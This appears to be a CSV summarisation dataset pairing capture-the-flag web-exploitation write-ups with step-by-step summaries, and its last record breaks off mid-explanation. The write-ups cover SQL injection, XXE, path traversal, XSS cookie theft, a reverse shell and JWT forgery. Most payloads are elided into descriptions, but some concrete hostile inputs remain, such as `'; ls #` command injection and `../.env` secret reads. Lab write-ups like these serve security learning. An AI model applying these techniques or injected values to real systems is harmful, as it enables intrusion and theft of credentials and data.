"text","summary"
"Analyzing `http://35.207.189.79/pyserver/server.py` some interesting snippets can be discovered.

The vulnerable functionality is the following, because the query contains parameters replaced and not sanitized.

[Python Flask API: Retrieve projects from the database based on the sorting criteria and offset value. Verify user is an admin and return the result as a JSON response]

To obtain the `token` value, a login with `admin` user must be performed. The `token` will be set into the cookies. The login can be performed like in the [Logged In challenge](https://github.com/m3ssap0/CTF-Writeups/tree/master/35C3%20Junior%20CTF/Logged%20In).

The `DB_SECRET` variable, with the flag, is stored in another table that can be discovered in the following function.

[Python function: Initialize database with migration script and a secrets table containing a single row with a secret value]

At this point a SQL injection payload can be crafted and sent to the server. The complete request with SQL injection payload is the following.

[HTTP POST: request with SQL Injection payload to retrieve project secrets]

The answer will be the following.

[HTTP response: Server returns a JSON object with one element containing null values for keys code, content, created, lastModified, public, title, and type; a non-null value for the key userName with the value of the flag]

So I got the flag.
","Analyze the Python Flask API at `http://35.207.189.79/pyserver/server.py` and identify the vulnerable functionality due to unsanitized parameters.

Perform a login as an admin user to obtain the `token` value, which will be set in the cookies.

Identify the `DB_SECRET` variable containing the flag, which is stored in another table.

Craft a SQL injection payload to target the vulnerable functionality.

Send the HTTP POST request with the SQL injection payload to the server.

Examine the HTTP response containing a JSON object with null values for most keys and a non-null value for the key userName with the flag value.

Retrieve the flag.
"
"The page shows the PHP snippet of which is composed and an image.

The PHP code is the following.

[PHP code that retrieves an image file based on the user's preferred language. The code is vulnerable to directory traversal attacks since it does not properly sanitize the input received from the user.]

The web site extracts the language passed via HTTP header, considers the first language and tries to load a picture from the `flags` folder; that picture will be displayed.

Even if the `str_replace('../', '', $lang)` instruction is used, the path traversal vulnerability is still present and can be abused using `....//` instead of `../`.

After some attempts, you will discover the correct HTTP header to use.

[HTTP header tampering attempt with path traversal payload to potentially retrieve a flag]

The returned ""image"" will be the following.

``[HTML image tag with base64-encoded JPEG data]

Decoding the Base64 will give you the flag.","Examine the PHP code snippet on the page, which is vulnerable to directory traversal attacks due to improper input sanitization.

Understand that the website retrieves the user's preferred language from the HTTP header and tries to load a corresponding image from the `flags` folder.

Exploit the path traversal vulnerability by using `....//` instead of `../`, bypassing the `str_replace('../', '', $lang)` instruction.

Craft an HTTP header tampering attempt with the path traversal payload to potentially retrieve a flag.

Analyze the returned ""image"" containing base64-encoded JPEG data.

Decode the base64 data to obtain the flag.
"
"Analyzing `http://35.207.189.79/pyserver/server.py` two interesting methods can be discovered.

The header is set in the following method.

[Python function to add security headers to HTTP responses with special handling for localhost requests]

The functionality that can be abused to generate a request from the same server is the following.

[Flask route to proxy and serve images, with basic validation checks]

This is the functionality used by the `loadImage` method in the programming environment.

The server runs at what defined here:

[Python script: starts a web application and listens for incoming HTTP requests on all available network interfaces at port 8075.]

An image is mandatory to abuse the service, because the Content-Type is strictly checked, but three extensions are blacklisted in the code that sets the target header.

Hence, the following image can be used: `img/paperbots.svg`.

The exploit is performed with a GET request like the following (or using `0.0.0.0` for the IP address).

[HTTP GET request to fetch an image from a remote server via a proxy endpoint]
    
The response will contain the flag.","Analyze `http://35.207.189.79/pyserver/server.py` to find two interesting methods related to security headers and proxying images.

Understand the server's functionality in adding security headers and proxying images with basic validation checks.

Identify that the server listens for incoming HTTP requests on all available network interfaces at port 8075.

Determine that an image is required to exploit the service, and choose `img/paperbots.svg` as the image.

Perform the exploit with an HTTP GET request, fetching the image from a remote server via a proxy endpoint (or using `0.0.0.0` for the IP address).

Receive the response containing the flag.
"
"The web site does not send double opt-in e-mail. A user can be registered, but the e-mail with the ""magic code"" needed to login will not be received.

Analyzing the response of the authentication API (i.e. `http://35.207.189.79/api/login`) a code can be found in the payload returned by the server. That code is the magic one that must be inserted in the window to complete the login.

After the login, a cookie will be set with the flag.","Understand that the website does not send a double opt-in email with a magic code for user login.

Analyze the authentication API response at `http://35.207.189.79/api/login` to find the magic code in the server's returned payload.

Use the magic code to complete the login process.

Receive a cookie containing the flag after successful login.
"
"Visiting `http://35.207.91.38/robots.txt` will reveal the following content.

[Robots.txt file that disallows web crawlers from accessing the "".DS_Store"" file in the ""/backup/"" directory]

So the `http://35.207.91.38/backup/.DS_Store` will download a `.DS_Store` file.

According to Wikipedia: in the Apple macOS operating system, .DS_Store is a file that stores custom attributes of its containing folder, such as the position of icons or the choice of a background image.

The ds_store_exp script could be used to download and extract hidden data.

[Python script for exploiting .DS_Store files on a web server]","Visit `http://35.207.91.38/robots.txt` to find the content disallowing access to the "".DS_Store"" file in the ""/backup/"" directory.

Access `http://35.207.91.38/backup/.DS_Store` to download the `.DS_Store` file.

Understand that .DS_Store files in macOS store custom attributes of their containing folder.

Use the ds_store_exp script to exploit the downloaded .DS_Store file and extract hidden data.
"
"Analyzing the HTML, you can find the following comment.

[HTML comment indicating that the source code for a project or website is located in a file named ""src.tgz"". The "".tgz"" extension usually indicates that the file has been compressed using the gzip utility.]

The archive contains both the frontend and the backend code.

Into the backend file `app.rb` you can discover the backend endpoint that must be called to retrieve the flag.

[Ruby code defining a web application route that returns the contents of the ""flag.txt"" file when the path ""/admin"" is accessed.]

The code that can be abused is into frontend `view.php` file.

[PHP code that checks if a file exists and has specific contents before outputting the contents of another file with a certain ID obtained from a backend server.]

The `int` cast is not present everywhere, so the `id` parameter can be crafted like the following.

[A relative file path or URL that goes two directories up from the current directory and then accesses a directory named ""admin"".]

With this parameter, the first two `if` statements will be true, because the result of the expression is the following, due to the fact that PHP will consider only the integer part for the cast.

[File path pointing to a password-protected file or directory.]

That result is a valid password file, the one created previously during the note submission.

The `file_get_contents` instruction will perform a HTTP GET call to the following backend endpoint.

That will be interpreted like `$BACKEND/admin`

Hence, the flag will be returned.","Analyze the HTML to find a comment indicating the location of the ""src.tgz"" file containing the project source code.

Extract the frontend and backend code from the ""src.tgz"" file.

Examine the backend file ""app.rb"" to discover the backend endpoint that returns the flag when the path ""/admin"" is accessed.

Identify vulnerable code in the frontend ""view.php"" file.

Craft an ""id"" parameter that bypasses the first two ""if"" statements in the PHP code by exploiting the lack of an ""int"" cast.

Use the crafted ""id"" parameter to make the ""file_get_contents"" instruction perform an HTTP GET call to the backend endpoint.

Access the backend endpoint at `$BACKEND/admin` to retrieve the flag.
"
"The page shows the PHP snippet of which is composed (I added the comments with numbers on interesting lines of code).

[PHP code with conditional statements that checks whether a given password input in the URL query parameter satisfies three conditions before outputting a secret flag. The code also includes a fallback to highlight the source code file if the password parameter is not provided.]

The `if` statement *#1* is useless for the analysis. `$_` is a normal variable populated with `pass` URL parameter content and the `@` clause does not affect anything in our scenario.

The `if` statement *#2* can be bypassed using the same value for `pass` URL parameter and for the User-Agent, because PHP's `==` gets confused with type conversions, lol.

The `if` statement *#3* contains the secret flag into a MD5 calculation, so it could seem hard to bypass, but:
* the MD5 hash can only have hex values from `0` to `f`;
* only the first char of two strings is considered in the comparison.

So the value of `$_[0]` can be between `0` and `f` only.

Trying single chars, from `0` to `f`, for the input of `pass` and User-Agent header, will reveal that `b` is the char that returns the flag.","Examine the PHP code snippet on the page that checks password input against three conditions before revealing a secret flag.

Determine that the first ""if"" statement is not relevant for the analysis.

Bypass the second ""if"" statement by using the same value for the `pass` URL parameter and the User-Agent header, exploiting PHP's `==` type conversion confusion.

Recognize that the third ""if"" statement contains the secret flag within an MD5 calculation, and the comparison only considers the first character of two strings.

Understand that the value of `$_[0]` can only be a single hex character from `0` to `f`.

Test single hex characters from `0` to `f` for both the `pass` input and the User-Agent header.

Discover that using the character `b` for both the `pass` input and the User-Agent header returns the flag.
"
"In the home page of the website there is the following HTML comment at the end.

[HTML comments containing the first part of the flag, and that the rest of the flag can be found on the ""d4rks0c1ety"" page.]

On the other page, you can find another HTML comment at the beginning.

[HTML comments containing the second part of the flag]

So we got the flag.","Examine the home page of the website to find an HTML comment at the end containing the first part of the flag.

Navigate to the ""d4rks0c1ety"" page as mentioned in the comment.

Locate another HTML comment at the beginning of the page containing the second part of the flag.

Combine the two parts to obtain the complete flag.
"
"The website home page contains a login form.

Analyzing browser cookies, you can find that admin_id is 0.

Changing it to 1 and refreshing the page will give you the flag.","Visit the website home page and locate the login form.

Examine browser cookies to find that the admin_id is set to 0.

Modify the admin_id value to 1 and refresh the page.

Obtain the flag upon refreshing the page.
"
"Analyzing the browser console, you can find an error:

[Error message indicating a syntax error in the jQuery library file ]

Going to that portion of the JavaScript file will reveal the flag.","Inspect the browser console to find an error message.

Identify the syntax error in the jQuery library file from the error message.

Navigate to the portion of the JavaScript file where the error is located.

Locate and retrieve the flag within the JavaScript file.
"
"In the home page of the website there is a strange message:
Wow INSTRUO team loves :cookie:

Analyzing browser cookies, you can find the flag encoded in base 64.

Decoding the Base64 cookie value will give you the flag","Visit the website home page and notice the strange message about INSTRUO team loving cookies.

Inspect browser cookies to find the flag encoded in base64.

Decode the base64 cookie value to obtain the flag.
"
"The website is a game where you have to click on the circle and don't click on the squares, both located on random positions each round. You have to click more than 20 times in 10 seconds.

[HTML code defining the structure and content of a web page, including links to external CSS and JavaScript files, and a canvas element.]

The [frontend source](main.js) is heavily obfuscated, but the challenge gives you the [backend source](index.js).

[Node.js server-side JavaScript code that creates an HTTP server using the Express.js library, which serves an HTML page containing a game. The game involves clicking on shapes that are randomly generated on the page, with the objective of earning a score greater than 20 within a 10-second time limit. If the player's score is high enough, the server will emit a message containing the flag.]

From this source code you can discover that positions are sent to the client into a JSON array and that the winning position is the first one sent.

Analyzing the HTTP traffic you can discover the format of each request/response packet and you can use this information to develop [your own client](solver-woooosh.py) able to win each round of the game.

[Python script that plays a game through a website's API. The game is identified by a URL stored in the ""target_site"" variable. The script communicates with the API through HTTP requests, sending and receiving data in JSON format. The script uses the ""requests"" library to send HTTP requests and the ""time"" and ""math"" libraries to generate timestamps and perform arithmetic operations, respectively.]

The flag is the following.","Visit the website, which features a game requiring players to click on circles and avoid squares, aiming for a score above 20 within 10 seconds.

Examine the frontend and backend source codes, noting that the frontend code is obfuscated and the backend code reveals that positions are sent to the client in a JSON array with the winning position being the first one.

Analyze HTTP traffic to determine the format of request/response packets.

Develop a custom client, utilizing the discovered information, capable of winning each round of the game.

Use the custom client to play the game and obtain the flag.
"
"The title reminds the XSS vulnerability.

The page can be used to post a message with an XSS attack. For example using an `img` tag like the following.

[HTML code for an image element with a ""src"" attribute pointing to ""foo.png"". The ""onerror"" attribute is set to execute JavaScript code that redirects the user to a specific URL while appending the document's cookie as a parameter.]

The website will return a code that can be used to identify the posted message.

The resulting code can be sent to administrator via the report page.

On a server listening with `nc`, you will receive the admin cookies.

[Terminal output showing a network connection being established and a GET request being made with various HTTP headers and parameters.]

Then the cookie can be used to perform a request to the admin page.

[HTTP request and response headers and body for a web page. The response body contains HTML code for an admin landing page with a secret cookie authentication system.]

The flag is the following.","Recognize that the challenge title suggests an XSS vulnerability.

Post a message containing an XSS attack using an `img` tag with a crafted ""onerror"" attribute to execute JavaScript code.

Receive a code from the website to identify the posted message.

Send the resulting code to the administrator via the report page.

Set up a server listening with `nc` to receive the admin cookies from the XSS attack.

Use the obtained admin cookies to perform a request to the admin page.

Retrieve the flag from the admin page response.
"
"The website shows a page like the following.

[HTML code for a webpage that includes an iframe that loads the content of another page (""/secret.html"") within the current page.]

You can discover the config.zip file with configurations.

Analyzing apache_ctf.conf file, you can find a rule that substitute a `secret` tag.

[Apache configuration for a reverse proxy server that listens on port 80, passes incoming requests to a backend server named ""main"", and applies some filters and substitutions to the server's responses. Also includes directives for setting request headers, logging, and error handling.]

So if you try to read `secret.html` page you will obtain the content with the substitution applied.

[HTTP request and response for a web page. The  response contains HTML code for a webpage that displays the text ""Protected"".]

You can use the `Range` HTTP header to exfiltrate the original `secret.html` page and get the flag.","Observe the website containing an iframe loading the content of ""/secret.html"" page.

Discover the ""config.zip"" file containing configurations.

Analyze ""apache_ctf.conf"" file and find a rule substituting a ""secret"" tag.

Try to read the ""secret.html"" page, receiving the substituted content.

Use the ""Range"" HTTP header to exfiltrate the original ""secret.html"" page.

Retrieve the flag from the exfiltrated ""secret.html"" page.
"
"The website contains a list of books with two actions available:
an excerpt to read an excerpt of the book;
read online which opens a link from another domain, not related to the challenge.

Analyzing the HTML source of the page a treasury.js file can be found; it is interesting to understand performed calls.

[Defines two functions: ""anexcerpt"" and ""readonline"" using JavaScript. The ""anexcerpt"" function creates a modal element and fetches an excerpt from a book using AJAX. The excerpt is then displayed in a text area inside the modal. The ""readonline"" function opens a new window with a link to read the book online.]

The home page is created with the following request.

[HTTP request to the server. The server responds with a 200 OK status code and returns a JSON array of books.]

The excerpt button performs a request like the following.

[HTTP GET request. The server responds with an HTTP 200 OK status code and returns a text/html response.]

The read online button simply opens a window redirecting to the link specified for the book.

A URL like the following will reveal that web application is vulnerable to SQL injection, because the result of the book with `id=1` will be printed.

[URL containing parameters for exploit SQL injection vulnerability]

The following URL will spawn a weird error.

[Warning messages indicating that there was an error in loading an XML string.]

It seems that the web application reads XML from a database.

You could use `sqlmap` to retrieve information.

[Output of a SQL injection test performed using the sqlmap tool]

So at this point you know that a `<flag>` XML element is hidden into `books` table, but not into book with `id = 1`; you can launch a custom query to exfiltrate only the `info` column for other books: `select info from ASISCTF.books where id > 1`.

[Command-line output of a successful SQL injection attack using the tool ""sqlmap""]

The flag is the following.
","Observe the website containing a list of books with ""excerpt"" and ""read online"" actions.

Analyze the HTML source and find ""treasury.js"" file to understand performed calls.

Investigate the home page request and the excerpt button request.

Discover the web application's vulnerability to SQL injection by altering the URL parameters.

Observe the error messages indicating that the web application reads XML from a database.

Use ""sqlmap"" tool to retrieve information and find the hidden `<flag>` XML element in the ""books"" table.

Perform a custom query to exfiltrate the ""info"" column for other books.

Retrieve the flag using the output from the successful SQL injection attack.
"
"Considering the XML-related error spawned previously and the hint provided into the `<flag>` element talking about a `/flag` file, you can understand that the application can be exploited via a XXE attack.

The malicious payload can be crafted and passed via the SQL injection vulnerability using a `UNION` operation. The application will parse the XML payload triggering the remote file read operation.

Let's consider a payload like the following to test the exploit.

[XML External Entity (XXE) Injection attack payload and result, where an attacker exploits a vulnerability in an XML parser to retrieve sensitive information from the target system. The payload is a malicious XML file that includes an external entity that points to a file (/etc/passwd) that the attacker wants to retrieve. The URL-encoded payload is used in the malicious URL to retrieve the file. The result shows the contents of the /etc/passwd file, indicating that the attack was successful.]

So it is possible to read remote files. PHP filters can be used to read source code via base64 encoding.

[Payload and URL-encoded payload of an XML External Entity (XXE) injection attack, along with the resulting encoded flag obtained from the attack on a vulnerable web application.]

Decoding the base64 encoded result you can obtain the flag.
","Consider the XML-related error and the hint about a `/flag` file to understand the potential for a XXE attack.

Craft a malicious payload and pass it via the SQL injection vulnerability using a `UNION` operation.

Test the exploit with a payload designed for an XXE Injection attack, attempting to retrieve a sensitive file (e.g., /etc/passwd).

Confirm the success of the attack by observing the contents of the targeted file.

Use PHP filters to read the source code via base64 encoding, preparing another payload for the XXE attack.

Execute the XXE attack using the URL-encoded payload and obtain the encoded flag from the vulnerable web application.

Decode the base64 encoded result to obtain the flag.
"
"You have to read the `flag.php` file. Connecting to the URL you can see the following source code.

[PHP code that checks if the ""view-source"" or ""warmup"" parameters are present in the URL query string. If ""view-source"" is present, the script outputs the contents of the current file. If ""warmup"" is present and contains only non-alphabetic characters and is less than or equal to 60 characters in length, the script executes the contents of the ""warmup"" parameter using the eval() function. Otherwise, the script outputs ""Try harder!"" or ""No param given"" depending on whether the ""warmup"" parameter is missing or invalid.]

There is an `eval` execution over the `warmup` GET parameter, but this parameter is checked in a very strict way, so there is no possibility to invoke functions directly.

Luckily, some techniques to bypass this kind of checks exist.

The best way to attack the endpoint is to read another HTTP GET parameter, with non-alfanumeric name, e.g. `_`.

I found two interesting websites:
[Bypass WAF - Php webshell without numbers and letters]
[`preg_match` Code Execution]

In the second website, there is the same scenario of the challenge, so I used it to craft my payload.

Using bitwise XOR operation in PHP, you can craft `_GET` string using non-alfanumeric chars and assign this value to a variable with a non-alfanumeric name.

[PHP code that assigns the string ""GET"" to the variable named ""_"" using bitwise XOR.]

Then you can specify the execution of the content of a GET parameter with the following code.

[PHP code that executes a function specified in the value of the ""_GET"" variable.]

So the payload that will be executed by the `eval` instruction will be the following.

Using a payload like the following, will let you to execute the `phpinfo` page.

The complete payload is the following.

The result of the attack will be the flag.","Analyze the PHP code on the target website, which includes an `eval` execution over the ""warmup"" GET parameter.

Identify the strict checks on the ""warmup"" parameter and determine that direct function invocation is not possible.

Research techniques to bypass such checks and find two relevant resources: ""Bypass WAF - Php webshell without numbers and letters"" and ""`preg_match` Code Execution.""

Use the second resource to craft a payload, creating a variable with a non-alphanumeric name and assigning it the string ""GET"" using a bitwise XOR operation in PHP.

Specify the execution of the content of a GET parameter using PHP code.

Combine the code snippets to create a complete payload that, when executed by the `eval` instruction, retrieves the flag.

Execute the attack with the crafted payload, obtaining the flag as a result.
"
"Connecting to the webpage you will get a message that says 'for API visit help page'.

The help page will give you the following information.

[HTML code for a webpage containing information about an FTP server API, including a list of endpoints and their corresponding HTTP methods, as well as the required parameters for each endpoint.]

Using the `/api/login` endpoint an error page will appear.

The error will leak the 'login_check' endpoint. Trying to use it, you will get a ""null token"".

This ""token"" can be used to authenticate on other endpoints to discover and retrieve the flag file.

The data is base64 encoded; decoding it you will find the flag.","Connect to the webpage and find a message directing you to the help page for the API.

Visit the help page to obtain information about the FTP server API, including endpoints, HTTP methods, and required parameters.

Use the `/api/login` endpoint, which results in an error page revealing the 'login_check' endpoint.

Try the 'login_check' endpoint and obtain a ""null token.""

Use the ""token"" to authenticate on other endpoints and retrieve the flag file.

Decode the base64-encoded data to find the flag.
"
"Analyzing the HTML of the page, you can discover a authentication.js.

The code at authentication.js is obfuscated.

The initial array contains base64 encoded strings.

Decoding them, you will obtain an array with some that contains these elements: 'Make a GET request to /hidden/nextstep.php','includes','length','log'

So you can discover another endpoint: nextstep.php to contact.

The HTTP response contains a ROT13 encrypted message in HTTP headers that can be easily decrypted and says: 'Make a POST request to /api/final.php'

Performing the `POST` request you will get the following answer: 'Send a post setting the variable flag'

Changing the `POST` request with a `flag` variable set will give you the flag.","Analyze the HTML of the page to discover the obfuscated authentication.js file.

Decode the base64-encoded strings in the initial array to find the elements pointing to the nextstep.php endpoint.

Make a GET request to the `/hidden/nextstep.php` endpoint.

Decrypt the ROT13 encrypted message in the HTTP headers, which directs you to make a POST request to `/api/final.php`.

Perform the POST request and receive the instruction to send a post setting the variable 'flag'.

Modify the POST request to include the 'flag' variable and obtain the flag.
"
"Connecting to the URL you will find a default Apache2 installation page.

Performing an enumeration will let you to discover the following.

[Bash commands used for web application testing and exploiting vulnerabilities, including the use of the DIRB tool for directory and file enumeration, and the discovery and exploitation of a Shellshock vulnerability in a CGI script.]

So you can use it to enumerate the root directory to find `flag.file`.

And then print it.

The content of the file is the hexadecimal representation of a GZip archive.

The flag.gz file can be re-created with an hexadecimal editor. If you open the archive you will find the `flag.txt` file with the flag.","Connect to the URL and find the default Apache2 installation page.

Perform enumeration using tools like DIRB to discover directories and files.

Enumerate the root directory to find the flag.file.

Print the contents of the `flag.file`, which is a hexadecimal representation of a GZip archive.

Re-create the `flag.gz` file using a hexadecimal editor.

Open the archive to find the `flag.txt` file containing the flag.
"
"The website prints a message.

Connecting to \robots.txt will give the following message.

So you can perform the requested HTTP GET and you will get the flag.","Visit the website and read the message.

Connect to the `/robots.txt` file.

Perform the requested HTTP GET request.

Obtain the flag.
"
"The website is an on-line calculator.

You can easily trigger an error and discover that it uses PHP eval().

So you can use PHP `system()` function to execute commands.

[HTTP POST request: with a payload that includes a command injection vulnerability]

You can list the directory.

And print the `index.php` file to discover the flag.","Visit the online calculator website.

Trigger an error to discover PHP eval() usage.

Use PHP `system()` function to execute commands.

List the directory.

Print the `index.php` file to obtain the flag.
"
"The left menu of the webpage is made up of items calling `get_life()` JavaScript method contained into a file.

[A JavaScript function that uses jQuery to make an AJAX request to a server with a given search query and populates an HTML table with the results.]

This method receives a string in input and uses it to contact a remote service endpoint, where requests are done to retrieve data.

The remote service is vulnerable to SQL injection.

At this point, you can discover that the used DBMS is MySQL.

[HTTP request and response exchanged between a client and a server]

Database schemas can be read.

Tables names for each schema can be read.

Columns for the `code` table in `alien_code` schema can be retrieved.

The content of the table can be retrieved so we get the flag.","Examine the left menu of the webpage, and identify the `get_life()` JavaScript method.

Understand that the method contacts a remote service endpoint and is vulnerable to SQL injection.

Determine that the used DBMS is MySQL.

Read database schemas.

Retrieve table names for each schema.

Obtain column names for the `code` table in the `alien_code` schema.

Retrieve the content of the table to obtain the flag.
"
"Analyzing the webpage, two strange cookies can be discovered

one is incremented at each refresh, the other contains a fixed part – at the beginning and at the end – and a variable part in the middle.

If you enumerate a great amount of cookies, you can notice that the format of variable part is the following:
previous char of the flag;
actual char of the flag;
index of the actual char.

So you can write a script to retrieve all chars and compose the flag.

","Analyze the webpage and discover two strange cookies.

Observe that one cookie increments with each refresh, while the other has a fixed part and a variable part.

Enumerate a large number of cookies and identify the format of the variable part.

Write a script to retrieve all characters and compose the flag.
"
"This was a guessing challenge and I didn't like it very much.

Trying to connect to the homepage will give you an error of HTTP method not allowed.

If you try a wrong HTTP verb, the server will return all the allowed methods.

Trying each method, you can discover that some of them, i.e. `POST` and `PUT`, will return a different result.

At this point you have to guess that some endpoints are present.

For each endpoint, you have to try all HTTP verbs in order to discover the correct one to use.

At this point, you have to guess that an `application/x-www-form-urlencoded` parameter must be used to perform the search operation

Using the `flag` value will give you another part of the flag.

Passing a random value will let you to discover that a *vim* command must be used.

Considering that the name of the parameter is `exit`, you have to discover that `:wq` is the correct value to use.

Putting everything together will give you the following.

At this point you can easily guess the first part of the flag (referred to the PDF).","Connect to the homepage and encounter an HTTP method not allowed error.

Try a wrong HTTP verb to get a list of allowed methods.

Test each method, discovering that `POST` and `PUT` return different results.

Guess the presence of endpoints and try all HTTP verbs for each one.

Guess the need for an `application/x-www-form-urlencoded` parameter to perform a search operation.

Use the `flag` value to obtain another part of the flag.

Pass a random value to discover that a vim command is required.

Determine that `:wq` is the correct value to use based on the parameter name `exit`.

Put everything together and guess the first part of the flag related to the PDF.
"
"The webpage contains the following HTML.

So you can discover the chase endpoint.

So you can discover the leftt endpoint.

So you can discover the shoot endpoint.

So you can discover the door endpoint.

So you can discover the door.js file.

So you can discover the open endpoint.

So you can discover the open_sesame.js file.

So you can discover the fight endpoint.

So you can discover the fight.js file.

So get the flag.","Discover the chase endpoint.

Discover the leftt endpoint.

Discover the shoot endpoint.

Discover the door endpoint.

Discover the door.js file.

Discover the open endpoint.

Discover the open_sesame.js file.

Discover the fight endpoint.

Discover the fight.js file.

Obtain the flag.
"
"The website has directory listing active, connecting to it two files are listed:
`login.php`
`login.php.bak`

The first page prints the message: `Not authenticated.`.

The login.php.bak contains the PHP source code.

Analyzing it, you can discover that a cookie named `otadmin` must be passed and its format must follow the following regex.

A correct value for that cookie can be the following;

If the passed value for that cookie is different from the MD5 hash of the `$cfg_pass` variable, a hint is given. You can use the correct value crafted befor to print it.

The hint is obtained by the following snippet.

Where strlen function gives 32 (i.e. the length of MD5 hashes is 32).

In that snippet, an AND operation is performed between the ASCII value of each char and the constant `0xC0` (i.e. `11000000`). Considering that the first three chars of the hint are 0, it means that the first original chars of the hash were numbers. That is due to the fact in the ASCII representation of numbers, the first most significant bits are `00` and the AND operation for that bits is performed with `11`.

So, the problem could be located in a *type juggling* in this comparison.

To exploit it, you have to guess the numbers at the beginning of the MD5 string.

A Python script can be written to exploit this task.

[Python code implementing a brute force attack against a login page. The code tries different cookie values by sending HTTP requests to the target URL until it finds the correct one that contains a flag.]

With the cookie you will discover the flag.
","Connect to the website and find `login.php` and `login.php.bak`.

Analyze `login.php.bak` to discover the required cookie format for otadmin.

Craft a correct value for the `otadmin` cookie.

Use the correct value to obtain a hint from the PHP code.

Analyze the hint and deduce that the problem could be in a type juggling comparison.

Guess the numbers at the beginning of the MD5 string.

Write a Python script to perform a brute force attack against the login page.

Discover the correct cookie value and obtain the flag.
"
"When you visit the website, you get redirected to `/?file=wc.php`. This might indicate that you can include files from the server, such as `/?file=/etc/passwd`. You can see in this file that there's a user called `ctf`, but that's not useful yet.

Moving on, you can find out that there's a `robots.txt` file at `?file=robots.txt`.
In it there is the `/?file=checkpass.php` file disallowed.

Visiting that URL, you get redirected back to `/wc.php`. However, it maybe that there's some code in `checkpass.php` that might be important. If you request it in `python` using `requests`, you can see that the response text says: ""IMPORTANT!!! The page is still under development. This has a secret, do not push this page.""

We can try to view the source of this page with the help of `php://filter`. Visit the website a base64 encoded string.

When you base64 decode this, you get some PHP code:
[This code shows the password as hardcoded, and that it's a cookie password. The page also contains an advice to not to push this page. The last line of the code redirects you to the homepage.]

Let's also check the source for `wc.php`. 

Here, you can see that a `password` cookie is being checked. Enter the password from the `$password` variable as the cookie (`w0rdc0unt123`), then you can see the webpage.

You also see in the source of `wc.php` that the input `$text` is obtained from the get param `text`, and is passed into `exec`. 
So, we can get remote code execution from here! Try with the payload: `'; ls #`

You can see the following output: ""The Character Count is: wc.php""

But, we know for a fact that there's also `robots.txt` and `checkpass.php` in this folder. You then findout that `echo exec(...)` returns only the last line of the output. We have 2 choices from here. Either we do `'; <command> | tr '\n' '' #` to replace all new-lines with spaces, throughout the rest of the exploit. Otherwise, you can try to spawn a reverse shell, and then use your server to navigate through the directories. I'm going to use the `reverse shell` method.
[Reverse shell payload: Execute a command to establish a reverse shell connection to your server]

Once you pass this in the input, you get a shell on your server!

Let's navigate through the file system and see if there's something interesting. You can see there's a folder `/ctf`. Inside that, there are a lot of folders.

There's also a a bash script called`findaas`, which you can be used to locate the file `flag.txt`. Alternatively, you can use the find command directly.

Now that you know where the flag is located, you can try to read the contents of the file using the cat command. However, when you try to read the flag file, you get a ""Permission denied"" error.

But there's a catch. You don't have permission to cat the flag. However, when you see the `README` file, it says that the password hash for `ctf` is `6f246c872cbf0b7fd7530b7aa235e67e`. You can bruteforce that using offline tools or using [crackstation.net], and find out that the password is `csictf` (maybe you could've guessed it too).

Now, you can switch to the `ctf` user using the `su` command with the password `csictf`.
Finally, you can print the flag by using the cat command with the flag file path.
","Visit website and notice the `/?file=wc.php` redirect, indicating possible file inclusion.
Explore `?file=/etc/passwd` and find `ctf` user.
Check `?file=robots.txt` and find `/?file=checkpass.php` disallowed.
Use `php://filter` to view the source of `checkpass.php`, find hardcoded password.
Check the source of `wc.php`, set the cookie with the password, and notice remote code execution.
Use a reverse shell payload to connect to the server.
Navigate through the file system to find the `flag.txt` file.
Find the `ctf` user's password hash in the `README` file and crack it.
Switch to the `ctf` user using `su` command and the cracked password.
Print the flag using the cat command with the flag file path.
"
"Description: ""You can steal a car if you steal its key.""

First, in the website source, you can see that there's a route to login (`/login`) and a route to get the names of the admins (`/adminNames`). So, when you try to visit `/login`, you see a form. Post that and check the response on the Network Tab in your browser. You can see there's a header called `token` which stores a JWT. You can decode the token (maybe on `jwt.io` to see that the payload is the following (I typed username: asd, password: asd):
`{ ""username"": ""nfq"", ""password"": ""nfq"", ""admin"": ""snyfr"", ""iat"": 1593506966 }`

We can see that the `username` changed from `asd` to `nfq`. So this hints that this could be `rot13`. When you apply the `rot13` cipher on the admin value `snyfr`, you see that it returns a string `false`. So, we can change this to a rot13 encrypted string for `true`, but to do that, we need the JWT secret.

On going back to the page, you see there's a route called `/adminNames`. It downloads a file for you, which has sort of a URL: `csivitu/authorized_users/blob/master/`. Seems familiar? This looks like a GitHub URL. So, if you visit that repository on GitHub, and checkout the `root`, you can see a list of usernames. These are the usernames of the website admins!

Now, in the JWT you were creating, you can change the `username` key to a rot13 encrypted version of one of these, for example, `ebrebuna` is the rot13 encrypted ciphertext for `roerohan`. Here's what our JWT payload looks like now:
`{ ""username"": ""ebrebuna"", ""password"": ""nfq"", ""admin"": ""gehr"", ""iat"": 1593506966 }`

But, we still need the JWT secret. If you observe the request on `/adminNames`, you see that it actally redirects to `/getFile?file=admins`. This route seems suspicious. We can try to include other files using this. When you try `/getFile?file=.env`, it returns `No such file or directory: /app/public/.env`. So, we can try `../.env` to come out of the public folder. You get a file in return, which is the `.env` containing the secret!

Now, visit the /admin route. It says that the token is invalid, so you'll have to pass the JWT in the headers. Auth tokens are generally passed in the Authorization header, so let's try that. When you pass the new formed JWT in the Authorization header, you can do this using python.
[Python snippet: Send a GET request to the /admin route with the JWT in the Authorization header]

The text in the response is:
""Hey roerohan! Here's your flag: pfvpgs{1a_gu3_3aq_1g_q0rfa'g_3i3a_z4gg3e}""

rot13 decrypt this flag to get the real flag.
","Examine the website source to find routes `/login` and `/adminNames`.
Fill out the login form and inspect the Network Tab in your browser to find the token header containing a JWT.
Decode the JWT to find the payload, then apply the `rot13` cipher to the `admin` value.
Visit the `/adminNames` route to download a file containing a GitHub URL, and find the list of admin usernames in the repository.
Modify the JWT payload with a rot13 encrypted admin username and change the admin value to the rot13 encrypted string for `true`.
Find the JWT secret by trying the `/getFile?file=../.env` route to download the `.env` file.
Send a GET request to the `/admin` route with the JWT in the Authorization header.
rot13 decrypt the received flag to get the real flag.
"
"Description: ""This is my file library. I don't have a lot of files, but I hope you like the ones I have!""

This exploit is owing to the `qs` package used by `express` to parse `req.query`. You can send an array instead of a string through the GET params in the following manner:
[GET request with an array as a parameter]

This makes the `req.names` in the backend an array: `['hello', 'world']`.
[JavaScript code of a simple Express app with a /getFile route and other routes]

The `/getFile` route is meant to get you a file from the server. But there are certain restrictions. First, you can't have ` `s or `/`s in your file. This prevents path traversal to an extent. 

Then, it checks that the `file` parameter has a length of less than 5 characters. If not, it takes just the first 5 characters. Then, it checks if the file extension is `js`, `ts`, `cpp`, or `c`, if yes, it allows you to read that file. If all these are satisfied, the path is resolved using `path.resolve()`.

